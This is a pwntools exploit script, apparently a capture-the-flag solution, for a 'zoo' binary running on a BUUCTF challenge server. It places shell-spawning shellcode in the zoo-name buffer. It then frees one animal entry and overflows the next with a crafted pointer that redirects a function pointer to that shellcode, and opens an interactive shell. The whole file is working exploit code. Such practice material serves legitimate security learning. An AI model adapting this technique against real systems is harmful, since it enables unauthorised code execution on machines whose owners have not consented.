from pwn import *
r = remote('node3.buuoj.cn',27536)
#r = process('./zoo')
elf = ELF('./zoo')
libc = ELF('/libc-2.23.so')
context(os='linux', arch='amd64')

def add_dog(name,weight):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Name : ',name)
	r.sendlineafter('Weight : ',str(weight))

def add_cat(name,weight):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('Name : ',name)
	r.sendlineafter('Weight : ',str(weight))

def listen(index):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('index of animal : ',str(index))

def show(index):
	r.sendlineafter('Your choice :','4')
	r.sendlineafter('index of animal : ',str(index))

def remove(index):
	r.sendlineafter('Your choice :','5')
	r.sendlineafter('index of animal : ',str(index))


name = 0x605420
r.recvuntil('Name of Your zoo :')
shellcode = asm(shellcraft.sh())
r.sendline(shellcode+p64(name))
add_dog('fuck',0)
add_dog('fuck',1)
remove(0)
add_dog('a'*0x48+p64(name+len(shellcode)),2)
listen(0)
r.interactive()